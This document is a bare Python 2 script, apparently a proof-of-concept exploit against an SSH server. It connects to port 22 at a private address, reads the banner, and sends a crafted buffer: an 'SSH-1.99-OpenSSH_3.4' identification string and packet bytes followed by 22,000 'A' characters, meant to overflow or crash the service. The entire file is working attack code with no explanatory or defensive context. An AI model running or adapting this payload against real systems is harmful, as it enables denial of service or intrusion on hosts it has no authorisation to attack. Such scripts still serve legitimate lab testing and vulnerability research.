#!/usr/bin/python

import socket, sys
import time

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

sock.connect(("172.16.73.129", 22))

message = sock.recv(1000)

print message

buffer = ("\x53\x53\x48\x2d\x31\x2e\x39\x39\x2d\x4f\x70\x65\x6e\x53\x53\x48"
"\x5f\x33\x2e\x34\x0a\x00\x00\x4f\x04\x05\x14\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x07\xde")
buffer += "A"*22000
buffer += "\r\n"

sock.send(buffer)
time.sleep(5)
sock.close()